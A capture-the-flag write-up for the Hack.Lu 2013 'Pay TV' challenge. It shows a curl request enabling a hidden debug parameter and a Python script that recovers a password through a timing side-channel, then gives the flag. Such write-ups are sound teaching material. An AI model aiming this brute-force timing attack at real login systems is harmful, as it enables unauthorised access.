# Pay TV writeup
    Hack.Lu CTF, 2013
    Writeup by pipecork

The robots want to watch pay-per-view. Challenge leads to a page with a few
cartoon robots watching static on a TV. To the side is a text entry form with a
button for the paytv password.

A quick inspection of the page source reveals that the password is indeed sent
to the server, so there's no javascript to reverse engineer. The challenge key
is sent by the server, so we'll need the correct password to get it. Closer
inspection shows a commented out '&debug' parameter being sent with the key:

    xhr.send('key=' + encodeURIComponent(key)/* + '&debug'*/)

Using curl to send a request with the parameter:

    curl 'https://ctf.fluxfingers.net:1316/gimmetv' -H 'Content-Type: application/x-www-form-urlencoded' --data 'key=password&debug'

Gives us a response of the format:

    {"start": 1382591326.126576, "end": 1382591326.126610, "response": "Wrong key.", "success": false}

A start and end time in epoch, likely of the time needed to process our given
password. So it sounds like a timing attack! Some dirty python:

    #!/usr/bin/env python

    import urllib
    import urllib.parse
    import urllib.request
    import string
    import json

    url = 'https://ctf.fluxfingers.net:1316/gimmetv'
    key_length = 10
    sample_size = 10

    def send_request(key):
      values = {'key' : key, 'debug' : 'true'}

      data = urllib.parse.urlencode(values)
      data = data.encode('utf-8')
      req = urllib.request.Request(url, data)
      response = urllib.request.urlopen(req)

      response_dict = json.loads(response.read().decode('utf-8'))
      return response_dict

    def parse_time_diff(response):
      end = response['end']
      start = response['start']
      return end*1000000 - start*1000000


    def main(): 
      charlist = list(string.ascii_letters + string.digits)
      key = ""

      for l in range(key_length):
        averages = []  
        for ch in charlist:
          time_diffs = []
          for i in range(sample_size):
            response = send_request(key + ch)
            diff = parse_time_diff(response)
            time_diffs.append(diff)

          average = sum(time_diffs)/len(time_diffs)
          averages.append(average)
          print(key, "+", ch, "average:", average)

        next_char = charlist[averages.index(max(averages))]
        key = key + next_char

      print("The password is or is a substring of", key)

    main()

After looking at a few responses, it became obvious that the processing time was
being artificially exaggerated, so taking multiple samples was unnecessary.

After checking every given partial key found, the correct key discovered was
`AXMNP93`. Typing that into the entry box shows the challenge key in the picture
TV screen, `OH_THAT_ARTWORK!`
